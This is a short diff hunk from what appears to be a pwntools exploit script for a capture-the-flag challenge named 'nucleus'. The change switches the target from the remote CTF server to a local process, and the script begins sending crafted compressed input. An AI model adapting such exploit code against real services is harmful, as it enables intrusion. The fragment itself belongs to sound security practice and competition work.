@@ -66,8 +66,8 @@ def show(ind):
     ru(b"content: ")
     return(re(6))
 
-# r = start()
-r = remote("nucleus.nc.jctf.pro", 1337)
+r = start()
+# r = remote("nucleus.nc.jctf.pro", 1337)
 
 compress(b"A"*1000)
 q = compress(b"X"*(int)(0x28/2))
